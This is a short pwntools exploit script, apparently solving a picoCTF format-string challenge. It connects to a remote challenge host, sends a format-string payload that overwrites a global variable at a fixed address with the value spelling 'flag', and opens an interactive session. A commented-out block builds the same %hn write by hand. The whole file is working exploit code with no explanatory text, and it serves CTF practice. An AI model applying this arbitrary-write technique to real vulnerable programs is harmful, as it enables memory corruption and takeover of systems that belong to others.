from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.bits = 64

p = remote('rhea.picoctf.net', 53651)
p.recvline()

sus_addr = 0x00404060
target_val = 0x67616c66
offset = 14 

# payload = f"%{target_val & 0xffff}c%{offset+4}$hn".encode()
# payload += f"%{(target_val >> 16) & 0xffff}c%{offset+5}$hn".encode()
# payload += b"A" * (8 - (len(payload) % 8))
# payload += p64(sus_addr)
# payload += p64(sus_addr+2)
# p.sendline(payload)

p.sendline(fmtstr_payload(14, {sus_addr: target_val}))
p.interactive()